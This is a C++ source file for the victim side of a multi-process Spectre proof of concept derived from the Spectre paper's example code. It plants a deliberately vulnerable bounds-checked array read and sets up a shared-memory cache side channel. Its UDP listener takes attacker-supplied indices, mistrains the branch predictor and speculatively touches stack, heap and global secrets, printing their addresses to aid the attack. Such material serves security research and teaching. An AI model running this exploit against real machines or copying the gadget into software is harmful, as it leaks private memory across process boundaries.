/*********************************************************************
*
* Multi-process Spectre PoC
*
* This source code is a derivative of the example code provided in the
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Modifications have been made by Luke McHale to demonstrate Spectre
* across seperate victim and attacker processes.
*
**********************************************************************/

// C++ Includes:
#include <iostream>
#include <string>
#include <vector>
#include <array>
#include <thread>
#include <mutex>
#include <chrono>

// C Includes:
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

// POSIX C Includes:
#include <sys/mman.h>  /* for POSIX Shared Memory */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

// Local Includes:
#include "udp_socket.h"
#include "defines.h"

/********************************************************************
Victim constants.
********************************************************************/
//constexpr size_t MAX_LEN = 256 * 512;


/********************************************************************
Victim private globals.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
//uint8_t array2[256 * 512];

constexpr size_t MAX_BUF_LENGTH = 4096;
// Contiguous, nearby secret in static-globals section:
char secret_global[MAX_BUF_LENGTH];
// Contiguous, secret's data exists on heap:
std::vector<char> secret_heap;
char* secret_stack;


/********************************************************************
Victim shared-memory.
********************************************************************/
region* sm_ptr;
uint8_t* array2;


/********************************************************************
Vulnerable victim function.
********************************************************************/
volatile uint8_t temp = 0; // So compiler won’t optimize out victim_function

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}


/********************************************************************
Helper/Initialization functions.
********************************************************************/
void update_secret(std::string& s) {
  char* cstring_copy = const_cast<char*>(s.c_str());

  // Update stack's secret:
  memcpy(secret_stack, cstring_copy, s.size());
  printf("secret_stack (%ld bytes) at VA: 0x%lX\n",
         std::min(s.size(),MAX_BUF_LENGTH) , (size_t)secret_stack);
  int64_t malicious_x = (int64_t)(secret_stack - (char *)array1);
  std::cout << "- byte offset relative to array1: " << malicious_x << '\n';

  // Update global's secret:
  memcpy(secret_global, cstring_copy, s.size());
  printf("secret_global (%ld bytes) at VA: 0x%lX\n",
         std::min(s.size(),MAX_BUF_LENGTH), (size_t)secret_global);
  malicious_x = (int64_t)(secret_global - (char *)array1);
  std::cout << "- byte offset relative to array1: " << malicious_x << '\n';

  // Update heap's secret:
  for (auto& c : secret_heap) {
    c = 0;  // erase old secret_heap if it exists...
  }
  secret_heap = std::vector<char>(s.size());
  memcpy(secret_heap.data(), cstring_copy, secret_heap.size());
  printf("secret_heap (%ld bytes) at VA: 0x%lX\n",
         secret_heap.size(), (size_t)secret_heap.data());
  malicious_x = (int64_t)(secret_heap.data() - (char *)array1);
  std::cout << "- byte offset relative to array1: " << malicious_x << '\n';

  // Erase strings used for initialization:
  for (size_t i = 0; i < s.size(); i++) {
    s[i] = 0;
    cstring_copy[i] = 0;
  }
}


void init_pages() {
  constexpr auto SM_HANDLENAME = "spectre-victim_shm";
  constexpr auto SM_SIZE = sizeof(region);
  constexpr size_t PAGE_SIZE = 1<<12;  // 4 KB Pages

  // Setup shared memory for array2 (side-channel):
  int sm_handle = shm_open(SM_HANDLENAME, O_CREAT|O_TRUNC|O_RDWR, S_IRUSR|S_IWUSR);
  if (sm_handle < 0) {
    std::cerr << "Error opening shared memory with handle name: "
              << SM_HANDLENAME << std::endl;
    exit(EXIT_FAILURE);
  }
  if (ftruncate(sm_handle, SM_SIZE) < 0) {
    std::cerr << "Error on allocating shared memory of size: "
              << SM_SIZE << std::endl;
    exit(EXIT_FAILURE);
  }
  sm_ptr = static_cast<region*>(
        mmap(NULL, SM_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, sm_handle, 0) );
  if (sm_ptr == MAP_FAILED) {
    std::cerr << "Error mapping shared memory" << std::endl;
    exit(EXIT_FAILURE);
  }

  // Write to array2 to initialize pages:
  array2 = sm_ptr->array2;
  for (size_t i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
    array2[i] = 1;
  }
}


void print_config() {
  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    std::cout << "Version: commit " GIT_COMMIT_HASH "\n";
  #endif

  /* Print build configuration */
  std::cout << "Build: ";
  #ifndef NORDTSCP
    std::cout << "RDTSCP_SUPPORTED ";
  #else
    std::cout << "RDTSCP_NOT_SUPPORTED ";
  #endif
  #ifndef NOMFENCE
    std::cout << "MFENCE_SUPPORTED ";
  #else
    std::cout << "MFENCE_NOT_SUPPORTED ";
  #endif
  #ifndef NOCLFLUSH
    std::cout << "CLFLUSH_SUPPORTED ";
  #else
    std::cout << "CLFLUSH_NOT_SUPPORTED ";
  #endif
  std::cout << std::endl;

  /* Print information about vulnerable items */
  std::cout << "sizeof(size_t): " << sizeof(size_t) << " bytes." << std::endl;
  printf("array1 (%ld bytes) at VA: 0x%lX\n", sizeof(array1), (size_t)array1);
  printf("array2 (%ld bytes) at VA: 0x%lX\n", sizeof(region::array2), (size_t)array2);
}


/********************************************************************
UDP socket functions.
********************************************************************/
inline void flush_array2() {
#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (int i = 0; i < 256; i++)
      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (int j = 0; j < 16; j++)
      for (int i = 0; i < 256; i++)
        flush_memory_sse( &array2[i*512] );
#endif
}


inline void flush_condition() {
#ifndef NOCLFLUSH
      _mm_clflush( &array1_size );
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */
      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      }
#endif

      /* Delay (can also mfence) */
#ifndef NOMFENCE
      _mm_mfence();
#else
      for (volatile int z = 0; z < 100; z++) {}
#endif
}


inline bool touch_secret(size_t i = 0) {
  return (secret_global[i] == secret_heap[i] == secret_stack[i]);
}


void helper(size_t malicious_x, size_t training_x = 0) {
  flush_array2(); // ensures side-channel is uncached (optional?)
  volatile bool equal = touch_secret(); // ensures secret is cached (optional?)

  /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
  for (int j = 29; j >= 0; j--) {
    flush_condition();  // ensures speculation occurs (optional?)

    /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
    /* Avoid jumps in case those tip off the branch predictor */
    size_t x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
    x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
    x = training_x ^ (x & (malicious_x ^ training_x));

//    auto x = ((j % 6) == 0) ? malicious_x : training_x;

    /* Call the victim function! */
    victim_function(x);
  }
  /// attacker may now measure cache state...
}


void recv_worker(uint16_t port = 7777) {
  constexpr size_t ARRAY1_LEN = 16;

  uint8_t buf[2048];

  SocketUDP s;
  s.open(port);

  std::cout << "["<<port<<"] - Receive worker thread listening." << std::endl;

  size_t tries = 0;
  for (;;) {
    auto bytes = s.recv(buf, sizeof(buf));
    if (bytes == sizeof(msg)) {
      msg& m = reinterpret_cast<msg&>(buf);
      auto x = m.x;

//#define DEBUG
#ifdef DEBUG
      std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
      std::cout << "x=" << x << std::endl;
#endif

      // Target malicious_x:
      auto malicious_x = x;

      // Pick a valid training_x:
      // - Note: we will be blind to the cache line at this training_x...
      size_t training_x = (tries++ * 13) % ARRAY1_LEN;
      m.x = training_x;   // let attacker know the training_x used...

      // Train victom_function training_x, then poke with malicious_x:
      helper(malicious_x, training_x);
      s.send(&m, sizeof(m));
    }
    else {
      std::cerr << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
      return;
    }
  }
}


/********************************************************************
Main.
*********************************************************************
*  Command line arguments:
*  1: UDP Port (int)
*/
int main(int argc, const char *argv[]) {
  // Initialization:
  init_pages();   // Setup shared memory for array2 (side-channel)
  print_config();

  /* Parse the listen port from the first command line argument.
     (OPTIONAL) */
  int port = 7777;
  if (argc >= 2) {
    port = atoi(argv[1]);
    if ( !(port > 0 && port < (1<<16)-1) ) {
      std::cerr << "Overriding command line argument for port." << std::endl;
      port = 7777;
    }
  }

  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
  // only CPU i as set.
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(1, &cpuset);

  // Setup receive thread to imitate server:
  std::thread t(recv_worker, port);
  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
  if (rc != 0) {
    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
  }

  std::this_thread::sleep_for(std::chrono::seconds(1));

  // Loop forever, allowing user to enter new secrets:
  char secet_local[MAX_BUF_LENGTH];
  secret_stack = secet_local;  // set global pointer
  for (;;) {
    std::string buf;
    std::cout << "Please enter secret string:" << std::endl;
    std::getline(std::cin, buf);

    if (buf.length() > 0) {
      update_secret(buf);
    }
  }

  return EXIT_SUCCESS;
}
